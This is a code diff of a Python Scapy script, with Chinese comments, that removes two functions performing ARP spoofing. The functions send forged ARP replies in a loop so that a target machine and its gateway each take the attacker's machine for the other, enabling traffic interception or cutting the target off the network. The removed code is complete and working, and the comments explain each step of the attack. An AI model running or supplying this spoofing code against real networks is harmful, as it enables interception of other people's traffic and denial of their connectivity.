@@ -100,69 +100,9 @@ def get_mac(ip_address):
         return r[Ether].src
     return None
 
-def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
-    # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
-    # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
-    poison_target = ARP()
-    poison_target.op = 2                # 响应报文
-    poison_target.psrc = gateway_ip     # 模拟是网关发出的, 其实是我们的机器发出的
-    poison_target.pdst = target_ip      # 目的地是目标机器
-    poison_target.hwdst = target_mac    # 目标的物理地址是目标机器的mac
 
-    # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
-    poison_gateway = ARP()
-    poison_gateway.op = 2               # 响应报文
-    poison_gateway.psrc = target_ip     # 模拟是目标机器发出的,
-    poison_gateway.pdst = gateway_ip    # 目的地是网关
-    poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
 
-    print "[*] Beginning the ARP poison. ［CTRL_C to stop］"
-
-    while True:
-        try:
-            print 'send arp packet'
-            # 开始发送ARP欺骗包(投毒)
-            send(poison_target)
-            send(poison_gateway)
-            # 停两秒
-            time.sleep(2)
-        except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-
-    print "[*] ARP poison attack finished"
-    return
-
-def cut_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    # 构建欺骗目标的ARP请求()，这里没设置hwsrc,默认就是本机咯
-    # 简单来说：告诉被攻击机器，本机（攻击机）的mac是网关，就是攻击者的机器是网关
-    poison_target = ARP()
-    poison_target.op = 2                # 响应报文
-    poison_target.psrc = gateway_ip     # 模拟是网关发出的, 其实是我们的机器发出的
-    poison_target.pdst = target_ip      # 目的地是目标机器
-    poison_target.hwdst = target_mac    # 目标的物理地址是目标机器的mac
-
-    # 构建欺骗网关的ARP请求()，这里没设置hwsrc,默认就是本机咯
-    poison_gateway = ARP()
-    poison_gateway.op = 2               # 响应报文
-    poison_gateway.psrc = target_ip     # 模拟是目标机器发出的,
-    poison_gateway.pdst = gateway_ip    # 目的地是网关
-    poison_gateway.hwdst = gateway_mac  # 目标的物理地址是网关的mac
-
-    print "[*] Beginning the ARP attack. ［CTRL_C to stop］"
-
-    while True:
-        try:
-            # 开始发送ARP欺骗包(投毒)
-            send(poison_target)
-            send(poison_gateway)
-            # 停两秒
-            time.sleep(2)
-        except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-
-    print "[*] ARP poison attack finished"
-    return
 
 
 
